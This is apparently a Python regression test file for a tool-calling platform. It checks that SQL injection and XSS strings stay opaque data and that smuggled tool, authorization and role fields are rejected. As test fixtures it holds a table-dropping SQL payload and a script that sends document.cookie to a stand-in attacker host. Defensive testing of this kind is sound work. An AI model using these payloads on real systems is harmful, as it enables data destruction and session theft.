"""Supplemental SQLi, XSS and tool-parameter injection regressions."""
import unittest

from tests.test_issue_21_c_21_02_security_negative import SecurityNegativeRegressionTests


class SecurityInjectionBoundaryTests(unittest.IsolatedAsyncioTestCase):
    async def asyncSetUp(self):
        await SecurityNegativeRegressionTests.asyncSetUp(self)

    async def test_sql_injection_payload_remains_opaque_tool_data(self):
        payload = "' OR 1=1; DROP TABLE platform_users; --"
        await SecurityNegativeRegressionTests._call(
            self,
            arguments={"query": payload, "resource": "tenant:tenant-a:kb"},
        )
        self.assertEqual(self.executed, [{"query": payload, "resource": "tenant:tenant-a:kb"}])

    async def test_xss_payload_remains_opaque_tool_data(self):
        payload = '<script>fetch("https://attacker.invalid/?c="+document.cookie)</script>'
        await SecurityNegativeRegressionTests._call(
            self,
            arguments={"query": payload, "resource": "tenant:tenant-a:kb"},
        )
        self.assertEqual(self.executed[0]["query"], payload)
        self.assertNotIn("script", repr(self.audit.records))
        self.assertNotIn("script", repr(self.observer.inputs))

    async def test_tool_parameter_injection_is_rejected_before_handler(self):
        hostile = {
            "query": "normal search",
            "resource": "tenant:tenant-a:kb",
            "tool": "admin.delete",
            "arguments": {"approved": True},
            "authorization": {"role": "admin"},
        }
        with self.assertRaisesRegex(Exception, "registered schema"):
            await SecurityNegativeRegressionTests._call(self, arguments=hostile)
        self.assertEqual(self.executed, [])
        self.assertEqual(self.audit.records[-1]["outcome"], "denied")


if __name__ == "__main__":
    unittest.main()
